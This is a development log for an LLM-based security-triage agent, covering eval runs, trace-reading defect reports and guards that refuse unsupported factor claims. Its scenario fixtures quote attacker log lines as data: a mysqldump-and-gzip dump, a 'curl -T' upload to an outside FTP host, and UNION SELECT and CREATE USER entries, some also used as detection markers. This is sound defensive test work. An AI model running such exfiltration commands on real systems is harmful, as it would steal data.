| # | Ling 3.0 (run C) | DeepSeek v4.1 |
|---|---|---|
| 1 | `FAILED` (0.05) | `FAILED` (0.05) |
| 2 | `SUCCEEDED` (0.95) | `SUCCEEDED` (0.95) |
| 3 | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | identical |
| 4 | `SUCCEEDED` (0.95) | identical |
| 5A | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | identical |
| 5B | `SUCCEEDED` (0.95) | identical |
| 6 | `INCONCLUSIVE` (0.65, raw 0.90) | identical |

**All seven cases landed on byte-identical outcomes and scores across two
different models from different families.** That is the strongest evidence yet
that §7.2 does what it was built for: the model's judgement varies, the
arithmetic turning judgement into a verdict does not.

Where the stronger model shows is in *efficiency*, not verdicts:

| | Ling 3.0 | DeepSeek v4.1 |
|---|---|---|
| rejected assessments (self-corrections needed) | 7 | **2** |
| scenario 3 tool calls | 39 | **25** |
| tool-argument errors | 0 | 0 |
| wall clock, six scenarios | **13 min** | 32 min |

DeepSeek needed a third fewer self-corrections and was substantially more direct
on the hardest scenario. It is ~2.5x slower in wall clock, being a reasoning
model — irrelevant for the demo, which replays saved traces.

**Kept as the default** (`SOC_MODEL=deepseek-v4.1-flash-free`): scenario 5 case A
is the one thin margin in the suite, and fewer wasted turns plus reasoning
support is worth more than run speed.

---

## Part 9 — Second DeepSeek run, and a universal claim without universal coverage

Second full run on DeepSeek: **6/6, 16 minutes** (half the first run's 32). Six
of seven cases matched the first run exactly. One did not, and it passed for the
wrong reason.

### P-016 — `version_patched` asserted from one service out of three
**Severity:** factually wrong finding; scenario passed anyway, masking it

Scenario 3's **initial** conclusion came back `FAILED (0.05)` rather than the
specified `INCONCLUSIVE`. The final outcome was still `SUCCEEDED`, so the
harness passed it — the assertion only covers the final outcome.

The agent had declared `version_patched` (−0.30) citing **tomcat only**:

> "SRV-APP-03 runs tomcat 9.0.50. CVE-2020-1938 affects >=9.0.0,<9.0.31 …
> 9.0.50 is above the 9.0.31 fix and outside the affected range, so this host is
> NOT vulnerable to the only Tomcat CVE on record."

Every word of that is true. But the host also runs **mysql 5.7.28**, which is
inside CVE-2023-21980 (`>=5.7.0,<5.7.30`) — the SQL-injection CVE matching the
signature that opened the case. The trace confirms only one lookup before
concluding: `get_vulnerabilities(tomcat)`. It never compared the MySQL version at
all, on a SQL-injection alert.

**The structural insight.** `version_patched` means *"running version outside
**ALL** affected ranges"* — a **universal** claim. `version_in_range` means *"falls
inside **a** CVE's range"* — an **existential** one. A universal claim cannot be
established from a single service when the host runs several the KB covers; an
existential claim can be established from exactly one.

That asymmetry is checkable without judging any evidence:

- the bus records which services each asset runs (from `get_asset_info`) and
  which services were looked up (from `get_vulnerabilities`);
- `version_patched` is refused while any KB-covered service the host runs has
  not been looked up, naming the missing ones;
- `version_in_range` is deliberately **exempt**.

This stays on the right side of D-001. It does not decide whether a version is
in range — that remains the agent's judgement, and the whole point of §5.1. It
only refuses a claim about *all* services from someone who looked at *one*.

Verified against the exact live sequence: tomcat-only → **rejected** naming
`mysql, openssh`; after both lookups → **accepted**; `version_in_range` from a
single service → **accepted**. Four regression checks added (74/74 offline).

**Cost worth noting:** Scenario 1's host runs apache, mysql and openssh, all
KB-covered, so claiming `version_patched` there now requires three lookups where
the agent previously made two. That is the correct bar — "patched" should be
expensive to assert — but it is added friction on the one scenario that depends
on that factor.

**Lesson, again:** a green scenario is not proof the reasoning was sound. P-010
was the same shape, and both were found by reading traces rather than by the
pass/fail table.

### P-017 — I defeated my own sandbox lock
**Severity:** killed a live run; same class as P-014, and less excusable

The post-guard run reached scenario 6 and then simply stopped: no summary table,
`scenario_6.json` left at the previous run's timestamp, process exit 0.

**Cause:** the regression block added for P-016 called
`control.reset_sandbox(force=True)` inside `selfcheck.py`. `force=True` is
exactly the escape hatch that bypasses the `SandboxBusy` lock built in P-014 to
stop this happening. Running `selfcheck.py` while `run_all.py` was starting
scenario 6 therefore wiped `fixtures/run` again — through the very door I had
left open.

P-014 was a missing guard. This was a guard that existed, worked, and was
walked around by its own author.

**Fix:**
- `selfcheck.py` never forces. It now calls plain `reset_sandbox()` and, on
  `SandboxBusy`, prints `REFUSING TO RUN: …` and exits 2 rather than proceeding.
- Verified by holding the lock from a second process: selfcheck refuses, naming
  the holding pid and start time.
- `force=True` survives only as a deliberate manual override for a provably dead
  run; no script in the repo passes it.

**Rule taken from this:** an escape hatch that a test suite reaches for by
default is not an escape hatch, it is the default. The guard has to be the easy
path.

### P-018 — A transient 400 was treated as permanent
**Severity:** cost one scenario in the same run

Scenario 5 failed with
`HTTP 400 {"type":"bad_request","message":"Could not read the request body."}`.

`_post()` retried 408/429/5xx but treated every 400 as permanent — correct for a
validation error, wrong here. The first suspicion was payload size, so the
conversation was measured: **23 KB** of tool results across 25 calls. Nowhere
near a limit. This was a gateway failing to read the body — a transport failure
wearing a 400.

**Fix:** a narrow retry class. A 400 is retried only when its message matches a
body-read/transport pattern (`could not read the request body`, `connection
reset`, `timeout`, …); validation 400s, unknown-model 400s and
insufficient-credits errors are still raised immediately. Four regression checks
assert exactly that split (78/78 offline).

### Outcome after P-016 / P-017 / P-018

Scenarios 5 and 6 re-run to complete the set; all six now come from post-guard
code. Every case on its specified trajectory:

| # | Case | Trajectory | Action |
|---|---|---|---|
| 1 | CASE-1001 | `FAILED` (0.05) | none |
| 2 | CASE-2001 | `SUCCEEDED` (0.95) | block_ip |
| 3 | CASE-3001 | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | block_ip |
| 4 | CASE-4001 | `SUCCEEDED` (0.95) | block_ip → unblock_ip |
| 5 | CASE-5001 | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | block_ip |
| 5 | CASE-5002 | `SUCCEEDED` (0.95) | block_ip |
| 6 | CASE-6001 | `INCONCLUSIVE` (0.65, raw 0.90) | block_ip **precautionary** |

**The coverage guard did what it was built for.** Scenario 3's initial verdict is
back to the specified `INCONCLUSIVE (0.40)` with `version_in_range` — the correct
finding, since mysql 5.7.28 *is* inside CVE-2023-21980. The trace shows it looked
up **tomcat and mysql**, where the failing run stopped at tomcat alone. The guard
did not tell it what to conclude; it refused a universal claim made from partial
coverage, and the agent went and completed the coverage.

Offline: 78/78 behavioural, 12/12 guardrail.

---

## Part 10 — Review follow-up: the asymmetry generalises

An external review of the `version_patched` guard raised five points. Each was
verified before acting; one changed shape under verification.

### R-1 — The 0.75 boundary is real (verified, fixture-side guard added)

With mysql now correctly checked, `version_in_range` **alone** scores
`0.50 + 0.25 = 0.75`, and §7.2 maps `S >= 0.75` to `SUCCEEDED`. Confirmed
empirically:

| declared at T0 | S | outcome |
|---|---|---|
| `version_in_range` | **0.75** | **SUCCEEDED — breaks Scenario 3** |
| `version_in_range`, `packet_benign` | 0.65 | INCONCLUSIVE |
| `version_in_range`, `logs_clean` | 0.50 | INCONCLUSIVE |
| all three | 0.40 | INCONCLUSIVE |

If the agent declares the positive and neither negative, Scenario 3 concludes
`SUCCEEDED` at T0 and T1 has nothing to flip to.

Per §14 the thresholds are untouchable, so the guard is assertion-side: scenarios
3 and 5 now assert `initial_outcome == "INCONCLUSIVE"`, and `compliance.py`
records the boundary explicitly so it cannot be forgotten.

### R-2 — The asymmetry generalises to the other two negatives (implemented)

The review's central insight: **all three §7.2 positives are existential** (one
witness settles them) and **all three negatives are universal** ("I looked and
found nothing" is meaningless without a stated scope). `version_patched` was
guarded; the other two were the same bug shape, unguarded.

- **`logs_clean`** — the bus records every `time_range` queried. The factor is
  refused unless some query covered the alert timestamp (a query with no
  `time_range` reads everything and qualifies). Verified with a window that
  *returns rows but excludes the alert*: refused, naming the timestamp.
- **`packet_benign` / `exfil_indicators`** — the cited packet record must be the
  case's own alert. Stops case B characterising its traffic from case A's flow.
  This one is provenance rather than universality, which is why the positive
  twin is guarded too.

`logs_consistent` is deliberately left alone: one matching log line establishes
it, and demanding window proof for an existential claim would be wrong.

*Note on the review's predicted side effect:* it suggested the window guard would
also stop `reconsider()` carrying a stale `logs_clean` forward. That is true, but
it was **already** structurally impossible — `reconsider()` builds a fresh
`ToolBus`, so `ok_tools` is empty and the agent must re-call `get_server_logs`
before declaring any log factor at all. The window guard adds precision, not that
property.

### R-3 — Assert arguments, not tool names (implemented, and sharpened)

§11's "expected tools were called" passed the P-016 run:
`get_vulnerabilities` *was* called, just on the wrong service.

Replayed the actual P-016 trace (`ee50c21`) against the first implementation and
it **still passed** — because the agent did eventually look up mysql, during
reconsideration, long after concluding `FAILED` from tomcat alone. A whole-trace
argument search is not enough.

So the assertion is phase-aware: `("get_vulnerabilities", "service_name",
"mysql", "pre_conclusion")` searches only steps **before the first conclusion**.
Verified against both traces:

| trace | mysql before concluding | initial outcome |
|---|---|---|
| P-016 (`ee50c21`) | **False** | `FAILED` |
| current (`ce347ff`) | True | `INCONCLUSIVE` |

Both new assertions now fail the broken trace and pass the fixed one. Tool
*order* is still never asserted — that would be the scripted behaviour §3
guardrail 2 forbids.

### R-4 — Scenario 1 regression invariants (verified, automated)

Checked rather than assumed: `SRV-WEB-01` runs apache 2.4.58, mysql 8.0.36,
openssh 8.9p1 — all three KB-covered, all three outside every range, so
`version_patched` (and therefore `FAILED`) remains reachable at a cost of three
lookups. Every asset runs 2-3 services, inside the 2-4 bound that keeps the
gather loop from bloating. Both are now `compliance.py` checks rather than
facts someone has to remember.

### R-5 — The refusal is a hint, so it is now disclosed (implemented)

The guard names the missing services. That is a hint channel, and the report was
showing only `-> rejected` without the reason — so the evidence chain read as
though the agent had spontaneously decided to check MySQL. Section 2 of the
report now prints every refusal reason inline, followed by an explicit note that
the agent was told what was wrong and resubmitted.

### Why none of this violates D-001

Exhaustive coverage encodes no detection knowledge. A rule like *"SQLi alerts
must check SQL services"* would be a hardcoded signature→service mapping, and
that would be the D-001 violation — Python deciding what the evidence means.
Refusing a universal claim from partial coverage, or a scope claim with no
stated scope, is a statement about the **form** of the assertion, not its
content. The agent still decides which versions are in range, what the logs
show, and what any of it means.

Offline after this round: **84/84** behavioural, **15/15** guardrail.

### Validation run: 6/6 against a stricter bar, and both new guards fired

| # | Checks (was) | Result |
|---|---|---|
| 1 | **8/8** (6) | PASS |
| 2 | 7/7 | PASS |
| 3 | **10/10** (6) | PASS |
| 4 | 6/6 | PASS |
| 5 | **8/8** (6) | PASS |
| 6 | **9/9** (7) | PASS |

48 assertions, up from 38, with the additions landing exactly where the review
aimed them. Scenario 3 now asserts, and passed:

```
[PASS] get_vulnerabilities(service_name='mysql') was called before concluding
[PASS] get_asset_info(asset_id='SRV-DB-09') was called
[PASS] initial outcome 'INCONCLUSIVE' == 'INCONCLUSIVE'
[PASS] required factors established (missing: none)
```

**Both new guards fired live, and the agent recovered from each.**

- *Scenario 1, coverage guard:* `version_patched` on SRV-WEB-01 refused while a
  KB-covered service was unenumerated. The agent completed the coverage and
  reached `FAILED` legitimately.
- *Scenario 3, packet provenance:* the agent tried to declare `exfil_indicators`
  for CASE-3001 **while holding ALERT-2001's packet record** — a different
  scenario's alert. Precisely the borrowed-flow bug R-2 predicted, caught on its
  first live outing.

The second is worth dwelling on, because a guard that forces a *wrong* answer
would be worse than no guard. It did not. Refused, the agent read its own
alert's flow and declared `packet_benign` (−0.10) — correct, since ALERT-3001's
flow genuinely is benign (680 bytes, error page). It still reached
`SUCCEEDED (0.95)`, via `version_in_range + logs_consistent +
related_alert_corroborates − packet_benign`. The T1 exfiltration evidence lives
in SRV-DB-09's **logs**, which is where the fixture put it — not in this alert's
packet flow. The guard removed a factually unsupported +0.15 and the agent
arrived at the same verdict through evidence it had actually read.

---

## Part 11 — Second strict run, and a double-count found by reading citations

Second consecutive **48/48** on the stricter assertions. All seven cases landed
on byte-identical outcomes to the previous strict run, and the factor sets were
coherent throughout.

Guards that fired: the coverage guard on scenario 1 and a precondition refusal on
scenario 3 — both recovered from, as before.

### P-019 — `exfil_indicators` established from logs, double-counting evidence
**Severity:** reasoning quality; outcome unaffected
**Found:** by reading a citation, not by any assertion

Scenario 3's T1 conclusion declared `exfil_indicators` (+0.15). ALERT-3001's
packet record is benign (`exfil_indicators: false`, 2,932 bytes). The agent was
entirely transparent about this:

> "get_server_logs SRV-DB-09: '03:17:10 mysqldump --all-databases | gzip >
> /tmp/.cache/d.gz' followed by '03:19:02 curl -T /tmp/.cache/d.gz
> ftp://203.0.113.77/' … Note the ALERT-3001 flow's own packet metadata showed
> exfil_indicators=false, so this factor is grounded in the SRV-DB-09
> process/db logs, not on the original flow."

The exfiltration is real and the reasoning is sound. But §7.2 defines
`exfil_indicators` as *"packet metadata shows exfil / payload-anomaly
indicators"* — a packet-metadata finding. Establishing it from host logs means
the same body of evidence is counted twice: once as `logs_consistent` (+0.25)
and again as `exfil_indicators` (+0.15).

**Outcome was unaffected** — 1.15 and 1.00 both clamp to 0.95 `SUCCEEDED` — so
this is a reasoning-quality defect, not a verdict defect. Recorded as such
rather than dressed up as a near-miss.

**Fix is prompt-side, not structural.** The factor descriptions in the schema and
system prompt now state that `exfil_indicators` and `packet_benign` are grounded
in `get_packet_metadata` for the case's own alert only, and that exfiltration
found in host logs is `logs_consistent` — counting it again scores one body of
evidence twice.

Deliberately **not** enforced in code. Checking whether a citation's *content*
supports its factor would be Python deciding what the evidence means — the
D-001 violation. The provenance guard already ensures the agent read the right
alert's flow; whether that flow shows exfiltration remains its judgement.

**Third time the same lesson has paid out:** P-010, P-016 and now P-019 were all
found by reading traces and citations, never by the pass/fail table. The
assertions have caught genuine regressions since, but they cannot see a factor
that is defensible in isolation and wrong in its accounting.

---

## Part 12 — Post-verification follow-up

Five further points, each verified before acting. Two found real problems.

### F-1 — The fixture half was NOT sound (fixed)

The assertion catches a T0 `SUCCEEDED`; it does not prevent one. Checked whether
`logs_clean` is genuinely the only honest T0 reading:

- **Scenario 5 case A: sound.** Every seeded row is `Access denied` /
  `connection refused` / a benign GET. Nothing to read as success.
- **Scenario 3: NOT sound.** The last T0 row was
  `01:12:15 sshd: Accepted password for svc_app from 10.20.3.33` — a *successful*
  authentication five minutes after the failed injection. An agent could honestly
  read that as post-exploitation, declare `logs_consistent`, and reach
  `0.50 + 0.25 + 0.25 = 1.00 -> SUCCEEDED` at T0. An earlier trace shows the agent
  explicitly flagging that very line as something it needed to resolve.

`svc_app` is load-bearing for T1 (the lateral movement reuses it), so the row
could not simply be deleted. It is now unambiguous instead:

> `sshd: Accepted publickey for svc_app from 10.20.0.9 port 44120 - scheduled
> report-generation job, matches 30-day baseline for this account`

Same account, now clearly routine at T0, which makes the T1 lateral movement the
anomaly it was always meant to be.

Recorded as an S1-style automated invariant: `compliance.py` fails if any T0 row
for those two assets contains a success marker (`Rows_sent:`, `mysqldump`,
`curl -T`, `CREATE USER`, `GRANT`, `bytes sent`, `UNION SELECT`) or an
unannotated `auth_success`. **Adversarially verified** — injecting a
`Rows_sent: 4211` row makes the check FAIL, then the fixture is restored.

### F-2 — Phase-blindness audit (two gaps closed)

Every assertion over trace *contents* has P-016's failure mode: the right call at
the wrong time. Re-scoped all of them, and measured against real traces:

| assertion | result |
|---|---|
| S6 `get_server_logs` retry — both attempts pre-conclusion? | **2 of 2** pre-conclusion. Genuine retry, now asserted as `min_calls=[("get_server_logs", 2, "pre_conclusion")]` |
| S5 `get_related_alerts` pre-conclusion **in case B**? | True — now scoped to `CASE-5002` explicitly, so the correlation cannot be retrospective |
| S3/S5 — did the T1 flip include NEW tool calls? | S3: **16**, S5: **10**. Asserted via `gather_after_reconsider` |

Negative control on the last one: scenario 2, which has no reconsideration,
scores **0** — confirming the check is not vacuously positive.

### F-3 — Guards proven load-bearing, not merely wired

`15/15 guardrail passing` only says the guards exist. Monkeypatched each to
return `[]` and measured which checks break:

| guard no-op'd | failing checks |
|---|---|
| `check_preconditions` | 4 |
| `check_version_patched_coverage` | 2 |
| `check_negative_scope` | 3 |
| *(restored)* | **0** |

Each guard maps to its own distinct covering tests. A refactor that silently
no-ops any one of them now fails loudly.

(First attempt at this used regex source-patching and mis-attributed the failures
across two guards — the numbers above come from runtime monkeypatching, which is
precise. Worth recording because the imprecise version looked plausible.)

### F-4 — Superseded rationale: clean, and the real mechanism documented

Audited the codebase for anything crediting the window guard with forcing
re-gathering. Nothing did. The prompt line telling the agent not to carry forward
a stale "logs clean" reading is about its *reasoning* and is complementary, not
duplicative.

But the real mechanism was documented nowhere near where it lives, so a comment
now sits on the fresh-`ToolBus` line in `reconsider()` explaining that the empty
`ok_tools` is what makes §6.1's "gather, don't re-score" structural. Proven, not
asserted: a second bus declaring `logs_clean` without re-calling
`get_server_logs` is **rejected**.

### F-5 — Rehearsal artefact fixed in advance

`DEMO.md` now pins the exact set piece — `reports/CASE-1001.md` section 2, steps
8–10 — with the refusal, the `get_vulnerabilities(openssh)` that follows it, the
accepted resubmission, the one-sentence answer to "isn't the bus deciding the
verdict?", two follow-ups, and a backup artefact in `CASE-3001.md`. Nothing to
find live.

Offline after this round: **84/84** behavioural, **17/17** guardrail.

---

## Part 13 — Final pass (291b44a). Verified, then stopped.

Four checks and one doc addition. **No new guards.** The suite passes; further
structural work is unbudgeted risk against it.

### G-1 — The S3 annotation strengthened T1 rather than weakening it (verified)

The concern was that annotating T0's `svc_app` login as baseline might leave the
T1 flip reading as *"known account, more activity"*. It does not. Six nameable
differences, none of them volume:

| | T0 baseline | T1 lateral movement |
|---|---|---|
| direction | inbound auth | outbound `ssh` |
| peer | 10.20.0.9 (mgmt) | 10.20.2.99 (SRV-DB-09) |
| auth | publickey | credential **reuse** |
| host-key check | — | `StrictHostKeyChecking=no` |
| baseline | "matches 30-day baseline" | "outside its normal access pattern" |
| time | 01:12 | 03:14 |

The annotation in fact *created* the baseline that T1 visibly violates. The
contrast is now stated in the log text itself, so the agent can name it rather
than infer it.

### G-2 — Ablation finding recorded as a follow-up, not a headline (added)

`DEMO.md` carries it under "how do you know the evals themselves are sound?",
explicitly marked *do not volunteer*. The first ablation method regex-patched the
source and mis-attributed failures across two guards; it looked entirely
plausible. Runtime monkeypatching was precise, and the worse-looking-but-correct
numbers are the ones on record.

### G-3 — The set piece renders in the order it is narrated (verified)

Read `reports/CASE-1001.md` section 2 top-to-bottom as a judge would:

```
 4. get_vulnerabilities   ok        <- mysql
 5. get_vulnerabilities   ok        <- apache
 7. get_related_alerts    no_data
 8. submit_assessment     rejected  <- REFUSAL names openssh
 9. get_vulnerabilities   ok        <- openssh, in response
10. submit_assessment     accepted
```

The refusal is at step 8 and the openssh lookup at step 9. The narration
"it claimed patched having checked two of three, was refused, went and checked
the third, resubmitted" matches the page exactly — and steps 4/5 make "two of
three" concrete rather than rhetorical.

### G-4 — Both T0 invariants adversarially proven (verified)

The S5 case A invariant existed but had only been confirmed by reading. All three
adversarial edits are now caught:

| injected row | result |
|---|---|
| S5A: `Rows_sent: 8800 SELECT * FROM portal_users` | CAUGHT |
| S5A: unannotated `auth_success` for web_ro | CAUGHT |
| S3: reintroduced ambiguous `svc_app` password auth | CAUGHT |

Fixtures restored; 17/17 and 84/84 after.

### G-5 — Stop

Final state: **84/84** behavioural, **17/17** guardrail, six scenarios green on
48 live assertions across two consecutive runs, three guard families proven
load-bearing by ablation, a negative control on the reconsideration check, both
T0 fixture invariants adversarially tested, and a pinned demo artefact with two
backups.

README and DEMO.md brought current. Remaining effort belongs in rehearsal, not
in code.

---

## Part 14 — Naming the S5 failure, and taking it off the live path

Two corrections to how the project's own stability was being described. Neither
changes any code.

### H-1 — "One config line away" is retired as a stability answer

Earlier entries (P-015, Part 6) offered model escalation as the remedy for
Scenario 5's flake. That framing is withdrawn for the demo. It invites the
obvious follow-up — *so why didn't you flip it?* — whose honest answer is that
changing the model invalidates a passing 84/84 suite with no hours left to
re-verify. That is a resource excuse wearing a robustness costume, and it
contradicts everything the rest of the suite demonstrates.

The phrase remains accurate in D-002, where it describes the **provider
abstraction** — a genuine architectural property. It is no longer offered as an
answer to "how stable is it".

### H-2 — The failure has a name, so use the name

Carrying "green on two consecutive runs" and "failed once in six" in the same
breath reads as cherry-picking the moment a listener hears both. Stated properly,
the way the ablation numbers were stated:

**Five of six clean on a full run. The failure was Scenario 5 case A. Here is
exactly what it did.**

The failing run's declared factors:

| factor | Δ |
|---|---|
| `version_in_range` | +0.25 |
| `logs_clean` | **−0.25** |
| `packet_benign` | −0.10 |
| `related_alert_corroborates` | +0.15 |
| | **0.55** against a 0.75 threshold |

**The factor it declined to declare was `logs_consistent`.** It had re-read the
logs during reconsideration — verified in the trace at the time — and the result
contained all three injected exploitation entries: a `UNION SELECT` that
executed, 38,402 rows returned, 1.7 MB egress to the same source IP. It saw them
and kept `logs_clean` anyway.

Swapping that one factor, changing nothing else, gives **0.95 `SUCCEEDED`**. A
0.50 swing on a single sign. No other case in the suite turns on one.

Why it was defensible in isolation: case A is the 05:02 port scan; the
exploitation is timestamped 07:14 and belongs to the sibling alert — "clean for
my window". What it missed is that both alerts are one source against one asset.
That is what the `RELATED_CASE` prompt addition now says.

*Provenance note:* the failing trace itself was overwritten by the re-run before
being committed, so it is not recoverable from git. The account above rests on
`/tmp/live2.log` (the three FAIL lines) and the factor-by-factor diagnosis
recorded in P-015 while the trace was still on disk. Said plainly rather than
implying a trace exists to hand over.

### H-3 — Scenario 5 is off the live path entirely

`DEMO.md` now fixes the live slot to Scenario **1, 2 or 6** and says why:

- **S1** clamps to 0.05 against the floor,
- **S2** clamps to 0.95 against the ceiling,
- **S6** is forced `INCONCLUSIVE` by the degraded-evidence clamp no matter what
  the agent finds.

None of the three can be moved by a single judgement call. Scenario 5 runs from
its saved, passing trace — which is what §10 prescribes anyway. The flake risk
only ever existed if it was volunteered into the live run.

---

## Part 15 — logs_clean scope in correlated cases (live verification PENDING)

### J-1 — Precheck: timestamps are already available

`get_related_alerts` returns the full alert record, `timestamp` included, so the
guard needs no second lookup per related alert. Cheaper than estimated.

### J-2 — The specified guard alone would NOT have caught the observed failure

Checked before building. The passing S5 trace shows case A's reconsideration
calling `get_server_logs(SRV-WEB-04)` with **no `time_range`** — the whole log.
P-015 records that the failing run's query *"result contained all three injected
exploitation entries"*. So coverage was already complete in the failure. Widening
the required window refuses nothing there.

The observed failure was a **judgement** failure, not a scope failure: the agent
read the 07:14 rows and decided they belonged to the sibling alert.

So two halves were built, not one:

**(a) Coverage widening** (as specified). Once `get_related_alerts` has returned,
`logs_clean` requires the queried window union to span the earliest related-alert
timestamp too. Catches "declared clean from a 05:02-only window while a 07:14
sibling is known".

**(b) Cross-case contradiction** (the half that bites). If a related alert on the
same asset carries a stored conclusion of `SUCCEEDED`, and its timestamp falls
inside the window actually read, `logs_clean` is refused — it contradicts a
verdict the agent retrieved itself. This is the `CONTRADICTIONS` table extended
across cases.

Neither reads log content. (a) compares timestamps to a window; (b) compares a
declared factor against a stored outcome. D-001 holds: the agent still decides
what the logs show.

### J-3 — Blast radius measured, not assumed

Only `SRV-WEB-04` has sibling alerts. `get_related_alerts` returns `no_data` for
CASE-1001, CASE-3001 and CASE-5001's initial pass — verified by calling it — so
S1 and S3 keep declaring `logs_clean` untouched, and S5 case A's
`initial_outcome=INCONCLUSIVE` assertion is unaffected. The guard engages only in
case A's *reconsideration*, which is exactly where the flake lived.

### J-4 — Offline evidence complete; live evidence NOT

- **91/91** behavioural checks (7 new, covering both halves plus the
  "unchanged before `get_related_alerts` returns" control and
  `logs_consistent` staying exempt).
- Ablation: `check_negative_scope` no-op now fails **7** distinct checks, up
  from 3. `check_preconditions` 4, `check_version_patched_coverage` 2, restored 0.
- **17/17** guardrail checks.

**Live verification did not happen.** Three consecutive runs — two full suites
and one single scenario — were killed by the OS for low memory. The machine was
at 97% load with ~0.3 GB free of 15.3 GB, consumed by unrelated desktop
applications; `run_all.py` is a thin HTTP-bound script and was collateral.

Recorded as PENDING rather than claimed. The required evidence is the two
consecutive green full runs specified in the review; neither has been obtained.

**State left deliberately:**
- `traces/` and `reports/` restored to the last fully-verified set, so the viewer
  and the rehearsed set piece still reflect a real, complete, passing run.
- `DEMO.md` untouched — the review's precondition for editing it was two green
  runs, and that precondition is not met.
- The stale lock from the killed run was cleared by its own pid-liveness check,
  which is the P-014 guard working under a genuine crash rather than a simulated
  one.

**To resume:** free memory, then `python run_all.py` twice. If S5 case A's
reconsideration now refuses a `logs_clean` that previously passed, that is the
guard working as designed — but it changes what case A declares, and the factor
set must be re-read before the demo, not during.

### J-5 — The RELATED_CASE prompt instruction is now a backstop, not the mechanism

When Scenario 5 case A first flaked (P-015), the fix was prompt-side: a
`RELATED_CASE`-scoped paragraph telling the agent to judge whether THIS asset was
compromised by THIS source, and not to carry forward a stale "logs clean"
reading. That was a stopgap and is now demoted.

**Mechanism:** `check_negative_scope` refuses `logs_clean` when the queried
window misses a known sibling alert, or when a sibling case has already concluded
`SUCCEEDED` on the same asset inside the window read. The agent cannot declare it
regardless of what the prompt says.

**Backstop:** the prompt paragraph stays, because it shapes the agent toward the
right *reasoning* — judge the campaign, not the packet — where the guard only
refuses the *claim*. A guard that refuses without the agent understanding why
produces a resubmission that drops the factor rather than one that reconsiders
the evidence. Both are wanted; only one is load-bearing.

### J-6 — Lineage: this is the same defect shape, four times

Every one of these was an unguarded **universal** claim — a factor asserting
"I looked and found nothing" without a defined scope. Each was found the same
way: reading a trace, never the pass/fail table.

| # | Factor | The universal that was unguarded | Guard |
|---|---|---|---|
| **P-006** | `related_alert_corroborates` | claimed from a lookup that returned `no_data` | `check_preconditions` |
| **P-016** | `version_patched` | "outside ALL ranges" from 1 of 3 services | `check_version_patched_coverage` |
| **R-2** | `logs_clean` / `packet_benign` | clean "across the window" from a window excluding the alert; benign flow borrowed from another alert | `check_negative_scope` |
| **J-2** | `logs_clean` | clean "for this asset" while a sibling alert and its `SUCCEEDED` verdict sat inside the window read | `check_negative_scope` (extended) |

The rule that generalises: **§7.2's three positive factors are existential and
need one witness; its three negative factors are universal and need a stated
scope.** Every defect above is the same sentence with a different noun.

What keeps all four on the right side of D-001 is that none inspects evidence
*content*. They compare a declared factor against what was read (a tool result's
status, a service list, a timestamp, a stored outcome) — never against what the
evidence *means*. A rule like "SQLi alerts must check SQL services" would cross
that line; "you cannot say *all* after checking *some*" does not.

**Prediction worth recording:** if a fifth instance appears, it will be
`version_patched` or `packet_benign` gaining a new scope dimension the same way
`logs_clean` just did — not a new factor. The review's instruction not to hunt a
fifth guard is right; the place to look, if one surfaces in a trace, is the
scope of an existing negative.

### J-7 — Stale bytecode made a passing suite report as failing

Immediately after adding the J-5/J-6 artefacts, `compliance.py` reported **19/20**
and `selfcheck.py` **89/91**. The three failures were all S5 union-coverage
checks. The commit had already gone out.

**The source was never wrong.** `scenarios/definitions.py` held the correct
`07:14:02Z` throughout, and the pushed commit is clean — no corrupted fixture, no
stray `.bak`, no `__pycache__`.

**Cause:** the adversarial test for that very invariant edits
`scenarios/definitions.py`, runs `compliance.py` in a subprocess, then restores
the file with `shutil.move`. `move` carries the backup's mtime, which was older
than the `.pyc` compiled from the *modified* source — so Python kept serving
stale bytecode to every later process in the session. `find . -name __pycache__
-delete` restored 20/20 and 91/91 immediately.

**Two things worth keeping from it:**

1. The adversarial-fixture pattern used throughout this project (edit → run →
   restore) is safe for the *file*, but not for the *interpreter cache*. Any such
   test must clear `__pycache__` after restoring, or the next several checks in
   the same session report against code that no longer exists on disk.
2. I misread the failing count as the adversarial result and committed on it.
   The adversarial FAIL line and the post-restore total printed adjacently, and I
   took the second for the first. The check that caught it was re-reading the
   numbers rather than the narrative — the same habit that found P-010, P-016 and
   P-019.

No fix to product code was required. The lesson is about the test harness and
about reading output, not about the guard.

### J-8 — Point 3 partially discharged: 3 of 6 re-verified live, 3 blocked

`run_all.py` resets the sandbox per scenario, so running scenarios individually
is functionally identical to a full run — same isolation, same assertions, same
traces, only the summary table differs. That made incremental progress possible
under memory pressure.

**Re-verified live against the new guard (this round):**

| # | Checks | Notes |
|---|---|---|
| 1 | **8/8** | includes `get_vulnerabilities(mysql)` before concluding |
| 2 | **7/7** | |
| 3 | **11/11** | includes `gathered NEW evidence after reconsidering (17 tool calls)` and `initial outcome INCONCLUSIVE` |

**Not re-verified:** 4, 5, 6.

- Scenario 4 failed once on the transient `HTTP 400 "Could not read the request
  body."` — and the retry *was* wired and *did* classify it as transient, so it
  exhausted all six attempts across ~8 minutes of backoff. Subsequent attempts
  were killed by the OS before completing.
- Scenarios 5 and 6 never got a chance to run.

Six run attempts in total were killed for low memory (97-98% load, 0.16-0.32 GB
free of 15.3 GB, consumed by unrelated desktop applications).

**Artefact state, deliberately:** scenario 4's trace from the errored run — which
contained an `error` key and **zero cases** — was restored from git rather than
left in place. Scenarios 5 and 6 remain on their previously verified traces. The
committed set is therefore coherent and demo-safe: every trace in `traces/`
represents a real, complete, passing run, and none represents a crash.

**Still outstanding:** live re-verification of scenarios 4, 5 and 6 against the
correlated-case guard. Scenario 5 is the one that matters — it is the only
scenario whose behaviour the guard can change, and the expectation is that case
A's reconsideration now either declares `logs_consistent` or drops the log factor
rather than declaring `logs_clean`. Either path reaches `SUCCEEDED`; the factor
set must be read before the demo rather than during it.


---

## Part 16 - Closing out point 3, and two defects found doing it

### K-1 - run_all.py was never the memory problem (measured)

Point 1 was right to demand a measurement rather than an attribution. Sampled RSS
every 2s across a live scenario: **start 3 MB, peak 32 MB, flat** - against a
15.3 GB machine at 96% load. The OS kills were genuinely collateral from
unrelated desktop applications, but that is now measured rather than claimed.

### K-2 - The transient-400 retry was itself a failure-recovery defect

Point 3 was correct. `RETRY_STATUS` is now `(429, 500, 502, 503, 504, 529)`; 429
is the one retryable 4xx because it explicitly means try again, and 408 is
excluded. The fix paid off within minutes - a `402 Insufficient credits` failed
immediately with a clear message instead of ~8 minutes of pointless backoff.

